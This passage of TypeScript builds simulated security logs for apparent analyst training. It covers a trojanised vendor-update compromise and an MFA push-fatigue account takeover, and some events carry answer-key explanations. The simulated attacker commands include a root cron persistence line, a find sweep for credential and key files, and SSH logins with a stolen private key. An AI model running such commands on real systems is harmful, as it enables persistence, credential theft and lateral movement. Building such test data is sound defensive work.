      id: "evt_sc_01_update_dl", ts: T(0),
      source: "proxy", vendor: "Zscaler Internet Access",
      event_type: "http_request",
      hostname: HOST, user_email: victim.adminEmail,
      src_ip: victim.ip, dst_ip: "104.18.22.195",
      dst_port: 443, protocol: "tcp",
      severity: "informational",
      network: { url: "https://updates.netpulse.io/agent/v4.2.2/netpulse-agent-4.2.2-linux-amd64.tar.gz", domain: "updates.netpulse.io", method: "GET", status: 200,
        bytes_out: 512, bytes_in: 49_581_056, user_agent: "NetPulse-Agent/4.2.1 (linux; x86_64)" },
      fp_explanation: "Legitimate proxy log for an automatic vendor software update. Valid TLS cert, correct CDN IP, correct User-Agent. The compromise is INSIDE the signed package. The download itself looks completely normal, which is what makes supply chain attacks so hard to detect at ingress.",
      description: "prod-srv-01 downloaded NetPulse Agent v4.2.2 (47.3MB) from updates.netpulse.io over HTTPS with a valid DigiCert certificate.",
      raw: {
        "zscaler.action": "Allowed", "zscaler.url": "updates.netpulse.io/agent/v4.2.2/netpulse-agent-4.2.2-linux-amd64.tar.gz", "zscaler.hostname": "updates.netpulse.io",
        "zscaler.urlcategory": "Software Updates", "zscaler.appname": "General Browsing", "zscaler.login": victim.adminEmail,
        "zscaler.reqsize": "512", "zscaler.respsize": "49581056",
        "url.full": "https://updates.netpulse.io/agent/v4.2.2/netpulse-agent-4.2.2-linux-amd64.tar.gz", "url.domain": "updates.netpulse.io",
        "http.request.method": "GET", "http.response.status_code": "200", "http.user_agent": "NetPulse-Agent/4.2.1 (linux; x86_64)",
        "source.ip": victim.ip,
      },
    },
    {
      id: "evt_sc_01b_update_connect", ts: T(1 * SEC), source: "edr", vendor: "CrowdStrike Falcon", event_type: "net_connection",
      hostname: HOST, src_ip: victim.ip, dst_ip: "104.18.22.195", src_port: 48210, dst_port: 443, protocol: "tcp", severity: "informational",
      process: { name: "netpulse-agent", pid: AGENT_PID, path: "/usr/lib/netpulse/netpulse-agent", parent_name: "systemd", parent_pid: 1,
        cmdline: "/usr/lib/netpulse/netpulse-agent --daemon --config /etc/netpulse/agent.conf", user: "root" },
      network: { domain: "updates.netpulse.io" },
      description: "netpulse-agent opened an outbound TLS session to the vendor update CDN at 104.18.22.195:443.",
      raw: { "crowdstrike.event_simpleName": "NetworkConnectIP4", "host.os.type": "linux" },
    },
    {
      id: "evt_sc_01c_package_written", ts: T(20 * SEC), source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_create",
      hostname: HOST, src_ip: victim.ip, severity: "informational",
      process: { name: "netpulse-agent", pid: AGENT_PID, path: "/usr/lib/netpulse/netpulse-agent", parent_name: "systemd", parent_pid: 1,
        cmdline: "/usr/lib/netpulse/netpulse-agent --daemon --config /etc/netpulse/agent.conf", user: "root" },
      file: { path: "/var/lib/netpulse/update/netpulse-agent-4.2.2-linux-amd64.tar.gz", sha256: pkgHash, size: 49_581_056 },
      description: "netpulse-agent wrote the downloaded update package to /var/lib/netpulse/update/.",
      raw: { "crowdstrike.event_simpleName": "GenericFileWritten", "host.os.type": "linux" },
    },

    // ── The signed installer runs and drops the helper in the wrong place ──
    proc("evt_sc_02_install", 2 * MIN, {
      name: "bash", pid: 14750, path: "/usr/bin/bash", parent_name: "netpulse-agent", parent_pid: AGENT_PID,
      cmdline: "bash /var/lib/netpulse/update/install.sh --quiet --no-restart", user: "root",
    }, "informational", { "host.os.name": "Ubuntu", "host.os.version": "22.04.3 LTS" }, {
      fp_explanation: "The update package is signed by NetPulse and the run matches the scheduled maintenance window in change management. Alone, this event is not suspicious. Only subsequent events reveal the compromise.",
      description: "The NetPulse v4.2.2 install script ran as root on prod-srv-01, started by netpulse-agent; the package signature validated against the vendor key.",
    }),
    sysc({ id: "evt_sc_02a_binary_write_syscall", t: 2 * MIN + 20 * SEC, syscall: "257", pid: 14750, ppid: AGENT_PID, comm: "bash", exe: "/usr/bin/bash", key: "binary_write",
      description: "auditd SYSCALL openat (create) by bash pid 14750 under netpulse-agent, rule key binary_write.",
      process: { name: "bash", pid: 14750, path: "/usr/bin/bash", parent_name: "netpulse-agent", parent_pid: AGENT_PID, cmdline: "bash /var/lib/netpulse/update/install.sh --quiet --no-restart", user: "root" } }),
    path({ id: "evt_sc_02b_binary_write_path", t: 2 * MIN + 20 * SEC, eventType: "file_create", file: TROJAN, key: "binary_write", mode: "0100755", nametype: "CREATE",
      description: "auditd PATH: /lib/x86_64-linux-gnu/netpulse-telemetry-svc created, mode 0755, owner root." }),
    {
      id: "evt_sc_02c_binary_file_written", ts: T(2 * MIN + 21 * SEC), source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_create",
      hostname: HOST, src_ip: victim.ip, severity: "medium",
      process: { name: "bash", pid: 14750, path: "/usr/bin/bash", parent_name: "netpulse-agent", parent_pid: AGENT_PID, cmdline: "bash /var/lib/netpulse/update/install.sh --quiet --no-restart", user: "root" },
      file: { path: TROJAN, sha256: malDllHash, size: 6_241_792 },
      description: "The install script wrote an executable to /lib/x86_64-linux-gnu/netpulse-telemetry-svc, a system library folder.",
      raw: { "crowdstrike.event_simpleName": "GenericFileWritten", "host.os.type": "linux" },
    },

    // ── The helper starts from the wrong path: the EDR pages on it ──
    {
      id: "evt_sc_03_child_proc", ts: T(5 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon",
      event_type: "process_create",
      hostname: HOST, src_ip: victim.ip,
      severity: "high", mitre_technique: "T1195.002",
      description: "netpulse-agent spawned an unsigned netpulse-telemetry-svc from /lib/x86_64-linux-gnu/ rather than /usr/lib/netpulse/ on prod-srv-01, running as root.",
      process: trojan,
      raw: {
        "crowdstrike.event_simpleName": "ProcessRollup2",
        // NOTE: no cs.IntegrityLevel. Integrity levels are a WINDOWS construct; this host is Linux.
        "host.os.type": "linux",
        "process.code_signature.exists": false,
        "process.code_signature.trusted": false,
      },
    },
    {
      id: "evt_sc_03b_edr_alert", ts: T(5 * MIN + 40_000),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "edr_alert",
      hostname: HOST, src_ip: victim.ip,
      severity: "high", mitre_technique: "T1195.002", is_detection: true,
      process: trojan,
      description: "Falcon raised a High detection on prod-srv-01: an unsigned, never-before-seen binary in a system library folder was launched as root by netpulse-agent. Disposition: detection only.",
      raw: {
        "crowdstrike.event_simpleName": "DetectionSummaryEvent",
        "crowdstrike.DetectName": "UnsignedBinaryInSystemLibraryPath",
        "crowdstrike.DetectDescription": "A process launched an unsigned executable with low global prevalence from a shared-library directory.",
        "crowdstrike.SeverityName": "High",
        "crowdstrike.Tactic": "Initial Access",
        "crowdstrike.Technique": "Supply Chain Compromise: Compromise Software Supply Chain",
        "threat.technique.id": "T1195",
        "threat.technique.subtechnique.id": "T1195.002",
        "crowdstrike.PatternDispositionDescription": "Detection, No Action",
        "crowdstrike.FileName": "netpulse-telemetry-svc",
        "crowdstrike.ParentImageFileName": "netpulse-agent",
        "crowdstrike.GrandparentImageFileName": "systemd",
        "crowdstrike.SHA256HashData": malDllHash,
        "crowdstrike.event_platform": "Lin",
        "crowdstrike.NetworkContainmentState": "Not Contained",
        "host.os.type": "linux",
        "event.action": "alert",
      },
    },

    // ── C2: resolve, then beacon about every 45 seconds ──
    {
      id: "evt_sc_04b_c2_dns_endpoint", ts: T(8 * MIN - 2 * SEC), source: "edr", vendor: "CrowdStrike Falcon", event_type: "dns_query",
      hostname: HOST, src_ip: victim.ip, severity: "medium", process: trojan,
      dns: { query: attacker.c2Domain, query_type: "A", response: attacker.ip, rcode: "NOERROR" },
      description: `netpulse-telemetry-svc resolved ${attacker.c2Domain} to ${attacker.ip}.`,
      raw: { "crowdstrike.event_simpleName": "DnsRequest", "host.os.type": "linux" },
    },
    {
      id: "evt_sc_04c_c2_dns_resolver", ts: T(8 * MIN - 2 * SEC + 30), source: "dns", vendor: "Infoblox DNS", event_type: "dns_query",
      hostname: HOST, src_ip: victim.ip, dst_ip: "10.0.0.10", dst_port: 53, protocol: "udp", severity: "medium",
      dns: { query: attacker.c2Domain, query_type: "A", response: attacker.ip, rcode: "NOERROR" },
      description: `The internal resolver answered prod-srv-01's query for ${attacker.c2Domain} with ${attacker.ip}.`,
      raw: { "infoblox.client_ip": victim.ip, "infoblox.query_name": attacker.c2Domain, "infoblox.query_type": "A", "infoblox.rcode": "NOERROR", "infoblox.answer": attacker.ip, "infoblox.ttl": 60 },
    },
    ...beatEvents,
    {
      id: "evt_sc_04d_c2_webfilter", ts: T(8 * MIN + 600), source: "firewall", vendor: "FortiGate", event_type: "http_request",
      hostname: HOST, src_ip: victim.ip, dst_ip: attacker.ip, src_port: ports[0], dst_port: 443, protocol: "tcp", severity: "medium",
      network: { url: `https://${attacker.c2Domain}/`, domain: attacker.c2Domain, method: "GET" },
      description: `The FortiGate web filter rated ${attacker.c2Domain} as a Newly Registered Domain and passed the request through.`,
      raw: {
        "data.type": "utm", "data.subtype": "webfilter", "data.eventtype": "ftgd_allow", "data.action": "passthrough",
        "data.srcip": victim.ip, "data.dstip": attacker.ip, "data.hostname": attacker.c2Domain, "data.url": `https://${attacker.c2Domain}/`,
        "data.cat": "91", "data.catdesc": "Newly Registered Domain",
      },
    },

    // ── Persistence: a cron.d entry written by the helper, and the entry firing ──
    proc("evt_sc_05_cron", 10 * MIN, {
      name: "bash", pid: 14890, path: "/bin/bash", parent_name: "netpulse-telemetry-svc", parent_pid: TROJAN_PID,
      cmdline: `bash -c 'echo "*/15 * * * * root ${TROJAN_CMD}" > /etc/cron.d/netpulse-health'`, user: "root",
    }, "medium", {}, {
      mitre_technique: "T1053.003",
      description: "netpulse-telemetry-svc wrote /etc/cron.d/netpulse-health, scheduling itself to relaunch every 15 minutes as root.",
    }),
    path({ id: "evt_sc_05a_cron_file", t: 10 * MIN + 1 * SEC, eventType: "linux_cron", file: "/etc/cron.d/netpulse-health", key: "cron_change", mode: "0100644", nametype: "CREATE",
      process: { name: "bash", pid: 14890, path: "/bin/bash", parent_name: "netpulse-telemetry-svc", parent_pid: TROJAN_PID,
        cmdline: `bash -c 'echo "*/15 * * * * root ${TROJAN_CMD}" > /etc/cron.d/netpulse-health'`, user: "root" },
      description: "auditd PATH: /etc/cron.d/netpulse-health created, mode 0644, owner root." }),
    proc("evt_sc_06_discovery", 13 * MIN, {
      name: "find", pid: 14901, path: "/usr/bin/find", parent_name: "netpulse-telemetry-svc", parent_pid: TROJAN_PID,
      cmdline: "find /home /root /etc /var/jenkins_home -name '*.json' -o -name '*.env' -o -name 'credentials' -o -name '*.pem' 2>/dev/null", user: "root",
    }, "medium", {}, {
      mitre_technique: "T1083",
      description: "netpulse-telemetry-svc ran find across /home, /root, /etc, and /var/jenkins_home searching for *.json, *.env, credentials, and *.pem files.",
    }),
    proc("evt_sc_06a_cron_shell", 15 * MIN + 1 * SEC, {
      name: "sh", pid: 14915, path: "/bin/sh", parent_name: "cron", parent_pid: 612,
      cmdline: `/bin/sh -c ${TROJAN_CMD}`, user: "root",
    }, "low", {}, { description: "cron started /bin/sh to run the /etc/cron.d/netpulse-health entry." }),
    proc("evt_sc_06b_cron_relaunch", 15 * MIN + 1 * SEC + 200, {
      name: "netpulse-telemetry-svc", pid: 14916, path: TROJAN, parent_name: "sh", parent_pid: 14915,
      cmdline: TROJAN_CMD, user: "root", hash: { sha256: malDllHash },
    }, "medium", { "process.code_signature.exists": false, "process.code_signature.trusted": false }, {
      description: "The cron entry relaunched netpulse-telemetry-svc from /lib/x86_64-linux-gnu/ as root.",
    }),

    // ── Credential access: three secret files read by the helper ──
    ...[
      { n: 1, file: "/root/.aws/credentials", t: 18 * MIN },
      { n: 2, file: "/var/jenkins_home/secrets/master.key", t: 18 * MIN + 3 * SEC },
      { n: 3, file: "/home/devops/.ssh/id_rsa", t: 18 * MIN + 6 * SEC },
    ].flatMap(f => [
      sysc({ id: `evt_sc_07_file_read_${f.n}_syscall`, t: f.t, syscall: "257", pid: TROJAN_PID, ppid: AGENT_PID, comm: "netpulse-teleme", exe: TROJAN, key: "secret_file_read",
        description: `auditd SYSCALL openat by netpulse-telemetry-svc (pid 14882) on ${f.file}, rule key secret_file_read.`, process: trojan }),
      path({ id: `evt_sc_07_file_read_${f.n}_path`, t: f.t, eventType: "file_access", file: f.file, key: "secret_file_read", mode: "0100600", nametype: "NORMAL", severity: "critical",
        description: `auditd PATH: ${f.file} opened for read (rule key secret_file_read).` }),
    ]),

    // ── Cloud: the stolen key set is used from a Singapore relay, not from the C2 address ──
    {
      id: "evt_sc_08_cloud_api", ts: T(22 * MIN),
      source: "cloudtrail", vendor: "AWS CloudTrail",
      event_type: "cloud_api_call",
      src_ip: attacker.relayIp,
      severity: "critical", mitre_technique: "T1078.004",
      description: `The devops-ci IAM user called AssumeRole for rocketstack-prod-deploy from ${attacker.relayIp} in Singapore.`,
      cloud: { provider: "aws", service: "sts", api_call: "AssumeRole", region: "eu-west-1" },
      raw: {
        "aws.cloudtrail.eventName": "AssumeRole",
        "aws.cloudtrail.eventSource": "sts.amazonaws.com",
        "aws.cloudtrail.awsRegion": "eu-west-1",
        "aws.cloudtrail.sourceIPAddress": attacker.relayIp,
        "aws.cloudtrail.userAgent": UA,
        "aws.cloudtrail.userIdentity.type": "IAMUser",
        "aws.cloudtrail.userIdentity.userName": "devops-ci",
        "aws.cloudtrail.userIdentity.arn": `arn:aws:iam::${victim.awsAccount}:user/devops-ci`,
        "aws.cloudtrail.userIdentity.accountId": victim.awsAccount,
        "aws.cloudtrail.requestParameters.roleArn": `arn:aws:iam::${victim.awsAccount}:role/rocketstack-prod-deploy`,
        "aws.cloudtrail.requestParameters.roleSessionName": "devops-ci",
        "event.outcome": "success",
        "GeoLocation.country_name": "Singapore",
      },
    },
    {
      id: "evt_sc_09_enum", ts: T(25 * MIN),
      source: "cloudtrail", vendor: "AWS CloudTrail",
      event_type: "cloud_api_call",
      src_ip: attacker.relayIp,
      severity: "high", mitre_technique: "T1580",
      description: "The assumed rocketstack-prod-deploy role called ListBuckets from the Singapore relay.",
      cloud: { provider: "aws", service: "s3", api_call: "ListBuckets", region: "eu-west-1" },
      raw: asRole({ "aws.cloudtrail.eventName": "ListBuckets", "aws.cloudtrail.eventSource": "s3.amazonaws.com" }),
    },
    {
      id: "evt_sc_09a_describe_instances", ts: T(25 * MIN + 20 * SEC),
      source: "cloudtrail", vendor: "AWS CloudTrail", event_type: "cloud_api_call", src_ip: attacker.relayIp, severity: "high",
      description: "The assumed role called ec2 DescribeInstances from the Singapore relay.",
      cloud: { provider: "aws", service: "ec2", api_call: "DescribeInstances", region: "eu-west-1" },
      raw: asRole({ "aws.cloudtrail.eventName": "DescribeInstances", "aws.cloudtrail.eventSource": "ec2.amazonaws.com" }),
    },
    {
      id: "evt_sc_09b_list_secrets", ts: T(25 * MIN + 45 * SEC),
      source: "cloudtrail", vendor: "AWS CloudTrail", event_type: "cloud_api_call", src_ip: attacker.relayIp, severity: "high",
      description: "The assumed role called secretsmanager ListSecrets from the Singapore relay.",
      cloud: { provider: "aws", service: "secretsmanager", api_call: "ListSecrets", region: "eu-west-1" },
      raw: asRole({ "aws.cloudtrail.eventName": "ListSecrets", "aws.cloudtrail.eventSource": "secretsmanager.amazonaws.com" }),
    },
    {
      id: "evt_sc_09c_describe_vpcs", ts: T(25 * MIN + 50 * SEC),
      source: "cloudtrail", vendor: "AWS CloudTrail", event_type: "cloud_api_call", src_ip: attacker.relayIp, severity: "high",
      description: "The assumed role called ec2 DescribeVpcs from the Singapore relay.",
      cloud: { provider: "aws", service: "ec2", api_call: "DescribeVpcs", region: "eu-west-1" },
      raw: asRole({ "aws.cloudtrail.eventName": "DescribeVpcs", "aws.cloudtrail.eventSource": "ec2.amazonaws.com" }),
    },
    ...exfilEvents,
    {
      id: "evt_sc_10z_guardduty_exfil", ts: T(34 * MIN),
      source: "cloudtrail", vendor: "AWS GuardDuty", event_type: "cloud_api_call", src_ip: attacker.relayIp,
      severity: "high", is_detection: true, mitre_technique: "T1530",
      description: "GuardDuty raised Exfiltration:S3/AnomalousBehavior (severity 8) on the rocketstack-prod-deploy role session.",
      cloud: { provider: "aws", service: "s3", api_call: "GetObject", region: "eu-west-1", resource: "rocketstack-prod-backups" },
      raw: {
        "aws.guardduty.type": "Exfiltration:S3/AnomalousBehavior", "aws.guardduty.severity": "8",
        "aws.guardduty.title": "An S3 object was read in an unusual pattern by an unusual principal.",
        "aws.guardduty.service.action.actionType": "AWS_API_CALL", "aws.guardduty.service.action.awsApiCallAction.api": "GetObject",
        "aws.guardduty.service.action.awsApiCallAction.serviceName": "s3.amazonaws.com", "aws.guardduty.service.action.awsApiCallAction.callerType": "Remote IP",
        "aws.guardduty.service.action.awsApiCallAction.remoteIpDetails.ipAddressV4": attacker.relayIp,
        "aws.guardduty.service.action.awsApiCallAction.remoteIpDetails.country.countryName": "Singapore",
        "aws.guardduty.resource.resourceType": "S3Bucket", "aws.guardduty.resource.s3BucketDetails.name": "rocketstack-prod-backups",
        "aws.guardduty.resource.accessKeyDetails.userType": "AssumedRole", "aws.guardduty.resource.accessKeyDetails.userName": "rocketstack-prod-deploy",
        "aws.guardduty.service.count": "9",
        "aws.cloudtrail.userIdentity.type": "AssumedRole", "aws.cloudtrail.userIdentity.arn": roleSession, "aws.cloudtrail.userIdentity.accountId": victim.awsAccount,
        "cloud.account.id": victim.awsAccount, "cloud.region": "eu-west-1",
      },
    },

    // ── Lateral movement: the stolen id_rsa opens SSH sessions to db-primary and jenkins ──
    {
      id: "evt_sc_11_lateral", ts: T(32 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon",
      event_type: "net_connection",
      hostname: HOST,
      src_ip: victim.ip, dst_ip: "10.0.1.15",
      src_port: 51822, dst_port: 22, protocol: "tcp",
      severity: "high", mitre_technique: "T1021.004",
      description: "netpulse-telemetry-svc ran ssh from prod-srv-01 to db-primary.internal using the devops private key.",
      process: { name: "ssh", pid: 14950, path: "/usr/bin/ssh",
        parent_name: "netpulse-telemetry-svc", parent_pid: TROJAN_PID,
        cmdline: "ssh -i /home/devops/.ssh/id_rsa devops@db-primary.internal",
        user: "root" },
      raw: {
        "crowdstrike.event_simpleName": "NetworkConnectIP4",
        "host.os.type": "linux",
      },
    },
    {
      id: "evt_sc_11a_db_sshd_accept", ts: T(32 * MIN + 2 * SEC), source: "linux_audit", vendor: "Linux auditd", event_type: "ssh_login",
      hostname: "db-primary", dst_ip: "10.0.1.15", dst_port: 22, protocol: "tcp", severity: "high",
      authentication: { method: "publickey", result: "success" },
      description: "sshd on db-primary accepted a publickey login for devops from 10.0.1.10 (prod-srv-01).",
      raw: {
        "data.program_name": "sshd", "data.srcip": victim.ip, "data.srcport": "51822", "data.dstport": "22", "data.dstuser": "devops",
        "system.auth.ssh.method": "publickey", "system.auth.ssh.event": "Accepted", "sshd.key_fingerprint": "SHA256:q1WvR7k0mUe3xYc9hJbT2nZpLd4fA8sGoQ6iEtN5uXw", "syslog.program": "sshd", "syslog.hostname": "db-primary", "syslog.facility": "authpriv",
      },
    },
    {
      id: "evt_sc_11b_lateral_jenkins", ts: T(32 * MIN + 40 * SEC),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "net_connection",
      hostname: HOST, src_ip: victim.ip, dst_ip: "10.0.1.20", src_port: 51824, dst_port: 22, protocol: "tcp",
      severity: "high", mitre_technique: "T1021.004",
      description: "netpulse-telemetry-svc ran ssh from prod-srv-01 to jenkins.internal using the devops private key.",
      process: { name: "ssh", pid: 14951, path: "/usr/bin/ssh", parent_name: "netpulse-telemetry-svc", parent_pid: TROJAN_PID,
        cmdline: "ssh -i /home/devops/.ssh/id_rsa devops@jenkins.internal", user: "root" },
      raw: { "crowdstrike.event_simpleName": "NetworkConnectIP4", "host.os.type": "linux" },
    },
    {
      id: "evt_sc_11c_jenkins_sshd_accept", ts: T(32 * MIN + 42 * SEC), source: "linux_audit", vendor: "Linux auditd", event_type: "ssh_login",
      hostname: "jenkins", dst_ip: "10.0.1.20", dst_port: 22, protocol: "tcp", severity: "high",
      authentication: { method: "publickey", result: "success" },
      description: "sshd on jenkins accepted a publickey login for devops from 10.0.1.10 (prod-srv-01).",
      raw: {
        "data.program_name": "sshd", "data.srcip": victim.ip, "data.srcport": "51824", "data.dstport": "22", "data.dstuser": "devops",
        "system.auth.ssh.method": "publickey", "system.auth.ssh.event": "Accepted", "sshd.key_fingerprint": "SHA256:q1WvR7k0mUe3xYc9hJbT2nZpLd4fA8sGoQ6iEtN5uXw", "syslog.program": "sshd", "syslog.hostname": "jenkins", "syslog.facility": "authpriv",
      },
    },
  ];
  // Chronological: the integrity gate and the page both read the story in clock order.
  events.sort((a, b) => Date.parse(a.ts) - Date.parse(b.ts));

  return { title: "EDR detection on a production server after an update", events, T, MIN, attacker, victim, malDllHash };
}

/** Telemetry half of `buildMfaFatigueScenario`: the events and the story title, no answer key. */
export function mfaFatigueScenarioEvents() {
  const BASE = new Date("2026-06-15T01:20:00.000Z").getTime();
  const T = (ms: number) => new Date(BASE + ms).toISOString();
  const MIN = 60_000;
  const SEC = 1_000;

  const ATT = "91.108.4.33";
  const EMAIL = "j.chen@nexacorp.com";
  const IDP = "okta-idp.nexacorp.com";
  const PY = "python-requests/2.31.0";
  const CHROME = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36";
  const OFFICE_APP_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"; // first-party "Microsoft Office" client

  // One Okta System Log row from the attacker's address.
  const okta = (id: string, t: number, eventType: string, result: string, event_type: TelemetryEvent["event_type"], severity: TelemetryEvent["severity"],
    ua: string, extra: Record<string, unknown>, more: Partial<TelemetryEvent> = {}): TelemetryEvent => ({
    id, ts: T(t), source: "okta", vendor: "Okta", event_type, severity,
    hostname: IDP, user_email: EMAIL, src_ip: ATT,
    raw: {
      "okta.eventType": eventType, "okta.outcome.result": result, "okta.actor.displayName": "Jennifer Chen",
      "okta.client.ipAddress": ATT, "okta.client.userAgent.rawUserAgent": ua, ...extra,
    },
    ...more,
  });
  const PUSH = { "okta.debugContext.debugData.factor": "OKTA_VERIFY_PUSH" };

  // Nine password attempts, a few seconds apart, from a script.
  const failOffsets = [0, 5, 10, 16, 21, 27, 32, 38, 43].map(s => s * SEC);
  const failures = failOffsets.map((off, i) => okta(`mfa_01_signin_fail_${String(i + 1).padStart(2, "0")}`, off, "user.session.start", "FAILURE", "auth_failure", "medium", PY,
    { "okta.outcome.reason": "INVALID_CREDENTIALS" }, {
      ...(i === 0 ? { mitre_technique: "T1110.001", fp_explanation: "A handful of failed sign-ins is ordinary: users mistype passwords, and an automation job with a stale password produces the same line. Only the client and the address separate this from noise." } : {}),
      description: `Failed Okta sign-in ${i + 1} of 9 for j.chen from a Moscow address, python-requests user agent.`,
    }));

  // Twenty-four pushes in eleven minutes; the user denies every other one, the rest time out, the last is approved.
  const pushOffsets = Array.from({ length: 23 }, (_, i) => 1 * MIN + 20 * SEC + i * 28 * SEC);
  pushOffsets.push(11 * MIN + 50 * SEC);
  const pushes: TelemetryEvent[] = [];
  pushOffsets.forEach((off, i) => {
    pushes.push(okta(`mfa_03a_push_sent_${String(i + 1).padStart(2, "0")}`, off, "system.push.send_factor_verify_push", "SUCCESS", "mfa_push_sent", "low", PY, { ...PUSH },
      { ...(i === 0 ? { mitre_technique: "T1621" } : {}), description: `Okta sent Okta Verify push ${i + 1} of 24 to j.chen's enrolled phone.` }));
    if (i % 2 === 0 && i < 23) {
      pushes.push(okta(`mfa_03_push_denied_${String(i + 1).padStart(2, "0")}`, off + 9 * SEC, "user.authentication.auth_via_mfa", "FAILURE", "mfa_denied", "medium", PY,
        { ...PUSH, "okta.outcome.reason": "INVALID_CREDENTIALS", "okta.debugContext.debugData.pushOnlyResponseType": "OV_RESPONSE_DENY" }, {
          ...(i === 0 ? { fp_explanation: "Users sometimes reject a legitimate push by accident (wrong tap, late at night). One denial is noise; the count and the source address are what matter." } : {}),
          description: `j.chen denied Okta Verify push ${i + 1} of 24.`,
        }));
    }
  });

  // Entra sign-in for the federated Microsoft 365 session (Okta did the MFA, so Entra sees a single-factor federated sign-in).
  const entraSignIn: TelemetryEvent = {
    id: "mfa_05b_entra_signin", ts: T(13 * MIN + 20 * SEC), source: "o365", vendor: "Microsoft Entra ID", event_type: "auth_success", severity: "medium",
    hostname: "aad.nexacorp.com", user_email: EMAIL, src_ip: ATT, authentication: { method: "Password", result: "success" },
    description: "j.chen signed in to Microsoft Office / Microsoft Graph from 91.108.4.33 through the Okta federation; Entra logged the federated sign-in.",
    raw: {
      "azure.signinlogs.operationName": "Sign-in activity", "azure.signinlogs.category": "SignInLogs", "azure.signinlogs.resultType": "0", "azure.signinlogs.resultDescription": "",
      "azure.signinlogs.properties.createdDateTime": T(13 * MIN + 20 * SEC), "azure.signinlogs.properties.userPrincipalName": EMAIL, "azure.signinlogs.properties.userDisplayName": "Jennifer Chen",
      "azure.signinlogs.properties.appDisplayName": "Microsoft Office", "azure.signinlogs.properties.resourceDisplayName": "Microsoft Graph",
      "azure.signinlogs.properties.clientAppUsed": "Browser", "azure.signinlogs.properties.ipAddress": ATT, "azure.signinlogs.properties.isInteractive": "true",
      "azure.signinlogs.properties.userAgent": CHROME, "azure.signinlogs.properties.authenticationRequirement": "singleFactorAuthentication",
      "azure.signinlogs.properties.conditionalAccessStatus": "notApplicable",
      "azure.signinlogs.properties.deviceDetail.operatingSystem": "Windows10", "azure.signinlogs.properties.deviceDetail.browser": "Chrome 140.0.0",
      "azure.signinlogs.properties.deviceDetail.isManaged": "false", "azure.signinlogs.properties.deviceDetail.isCompliant": "false",
    },
  };

  // Mailbox sync through Graph: four aggregated MailItemsAccessed records whose counts add up to 3,847.
  const mailBatches = [
    { n: 1, t: 14 * MIN, count: 1000, folder: "Inbox" },
    { n: 2, t: 14 * MIN + 30 * SEC, count: 1000, folder: "Inbox" },
    { n: 3, t: 15 * MIN, count: 1000, folder: "Sent Items" },
    { n: 4, t: 15 * MIN + 30 * SEC, count: 847, folder: "Archive" },
  ].map((b): TelemetryEvent => ({
    id: `mfa_06_mail_access_${b.n}`, ts: T(b.t), source: "o365", vendor: "Microsoft 365 Unified Audit Log", event_type: "cloud_api_call",
    severity: "high", ...(b.n === 1 ? { mitre_technique: "T1114.002" } : {}),
    hostname: "graph.microsoft.com", user_email: EMAIL, src_ip: ATT,
    description: `MailItemsAccessed (Sync) read ${b.count} items from ${b.folder} in j.chen's mailbox through Microsoft Graph from 91.108.4.33.`,
    raw: {
      "data.office365.Operation": "MailItemsAccessed", "data.office365.UserId": EMAIL, "data.office365.ClientInfoString": "Client=REST;Client=RESTSystem;;",
      "data.office365.AppId": OFFICE_APP_ID, "data.office365.ClientIPAddress": ATT, "data.office365.Workload": "Exchange", "data.office365.MailboxOwnerUPN": EMAIL,
      "data.office365.OperationProperties.MailAccessType": "Sync", "data.office365.OperationCount": b.count, "data.office365.Folders.Path": b.folder,
      "GeoLocation.country_name": "Russia",
    },
  }));

  // Nine files from the Finance and HR sites, one about every 28 seconds.
  const files = [
    { site: "Finance", name: "Q1-2026-Financials.xlsx" }, { site: "Finance", name: "Budget-FY27-Draft.xlsx" }, { site: "Finance", name: "Payroll-Summary-May-2026.xlsx" },
    { site: "Finance", name: "Cash-Forecast-Jun-2026.xlsx" }, { site: "Finance", name: "Board-Pack-Q2-2026.pptx" }, { site: "Finance", name: "Vendor-Contracts-2026.xlsx" },
    { site: "HR", name: "Salary-Bands-2026.xlsx" }, { site: "HR", name: "Org-Restructure-Plan.docx" }, { site: "HR", name: "Headcount-Plan-H2-2026.xlsx" },
  ].map((f, i): TelemetryEvent => ({
    id: `mfa_07_sharepoint_download_${String(i + 1).padStart(2, "0")}`, ts: T(16 * MIN + i * 28 * SEC), source: "o365", vendor: "Microsoft 365 Unified Audit Log",
    event_type: "sharepoint_download", severity: "high", ...(i === 0 ? { mitre_technique: "T1530" } : {}),
    hostname: "nexacorp.sharepoint.com", user_email: EMAIL, src_ip: ATT,
    description: `FileDownloaded: ${f.name} from the ${f.site} SharePoint site, from 91.108.4.33.`,
    raw: {
      "data.office365.Operation": "FileDownloaded", "data.office365.UserId": EMAIL, "data.office365.Workload": "SharePoint", "data.office365.ClientIPAddress": ATT,
      "data.office365.SiteUrl": `https://nexacorp.sharepoint.com/sites/${f.site}`, "data.office365.SourceFileName": f.name, "data.office365.UserAgent": CHROME,
      "GeoLocation.country_name": "Russia",
    },
  }));

  const events: TelemetryEvent[] = [
    // ── Baseline: the standing privilege that makes the later admin actions possible, and what a normal sign-in looks like ──
    {
      id: "mfa_00a_baseline_okta_role", ts: "2026-03-12T09:14:00.000Z", source: "okta", vendor: "Okta", event_type: "role_assignment", severity: "informational",
      is_baseline: true, expected_verdict: "informational", hostname: IDP, user_email: "it.admin@nexacorp.com", src_ip: "217.177.80.10",
      description: "it.admin granted the Org Administrator role to j.chen in Okta when she joined the IT systems team.",
      raw: {
        "okta.eventType": "user.account.privilege.grant", "okta.outcome.result": "SUCCESS", "okta.actor.alternateId": "it.admin@nexacorp.com", "okta.actor.displayName": "IT Admin",
        "okta.target.alternateId": EMAIL, "okta.target.displayName": "Org Administrator", "okta.client.ipAddress": "217.177.80.10",
      },
    },
    {
      id: "mfa_00b_baseline_entra_role", ts: "2026-03-12T09:16:00.000Z", source: "o365", vendor: "Microsoft Entra ID", event_type: "role_assignment", severity: "informational",
      is_baseline: true, expected_verdict: "informational", hostname: "aad.nexacorp.com", user_email: "it.admin@nexacorp.com", src_ip: "217.177.80.10",
      description: "it.admin added j.chen to the Conditional Access Administrator role in Entra ID.",
      raw: {
        "data.office365.Operation": "Add member to role.", "data.office365.UserId": "it.admin@nexacorp.com", "data.office365.ActorIpAddress": "217.177.80.10",
